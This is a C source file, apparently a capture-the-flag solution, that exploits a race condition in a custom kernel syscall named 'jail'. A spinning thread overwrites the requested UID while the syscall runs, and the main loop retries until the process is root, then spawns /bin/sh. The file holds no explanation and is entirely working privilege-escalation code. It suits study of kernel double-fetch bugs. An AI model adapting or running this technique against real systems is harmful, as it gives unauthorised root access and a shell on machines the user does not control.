#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>

#define SYS_JAIL 451

typedef struct jail_info {
    int requested_uid;
    unsigned int requestor_uid;
    unsigned long long token;
} jail_info;


jail_info *info;
unsigned int ready = 0;


void *expl_thread() {
    while (1) {
        while (!ready) { };
        info->requested_uid = 0;
    }
}

bool is_root() {
    return (unsigned int)getuid() == 0;
}

void print_flag() {
    FILE *fp;
    int c;
    puts("----FLAG----");
    fp = fopen("/flag.txt","r");
    while (1) {
        c = fgetc(fp);
        if(feof(fp)) { 
            puts("");
            break;
        }
        printf("%c", c);
    }
    fclose(fp);
}

unsigned long long invoke_jail() {
    ready = 1;
    unsigned long long ret = syscall(SYS_JAIL, info);
    return ret;
}

void expl_run() {
    info->requested_uid = -1;
    invoke_jail();
}

void exploit() {
    pthread_t expl_thread_id;

    pthread_create(&expl_thread_id, NULL, expl_thread, NULL);
    info->requested_uid = -1;
    
    while (1) {
        expl_run();
        if (is_root()) {
            puts("Got root!!!!");
            printf("euid = %u\n", (unsigned int)getuid());
            system("/bin/sh");
            exit(0);
        } else {
            printf("Race failed euid: %u\n", (unsigned int)getuid());
            ready = 0;
        }
    }
    pthread_join(expl_thread_id, NULL);
}


int main() {
    info = (jail_info *)malloc(sizeof(jail_info));
    exploit();
}
